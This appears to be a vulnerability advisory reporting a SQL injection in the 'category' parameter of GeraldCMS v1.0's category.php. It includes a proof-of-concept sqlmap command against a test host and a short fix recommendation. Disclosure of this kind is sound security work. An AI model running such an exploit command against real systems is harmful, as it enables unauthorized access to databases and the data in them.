# GeraldCMS - SQL Injection (Category)

### Vendor Homepage:

> https://github.com/

### Software Link:

> [GeraldCMS](https://github.com/geraldib/GeraldCMS)

### Version:

> v 1.0

### SQL Injection:

> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or "injection" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.

### Affected Components:

> /GeraldCMS-main/category.php

> The parameters `category` within category.php are vulnerable to SQL Injection.


![category](https://github.com/jxp98/VulResearch/blob/main/2024/02/img/2.3GeraldCMS-Sqli-Category.png)



### Description:

> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.

## Proof of Concept:

### SQLMap

Use `sqlmap` with `-u` option to exploit the vulnerability:

```
python sqlmap.py -u "http://172.16.8.56/GeraldCMS-main/category.php?category=1" -p category  --batch --dbms MYSQL --is-dba
```


## Recommendations

When using this GeraldCMS, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.
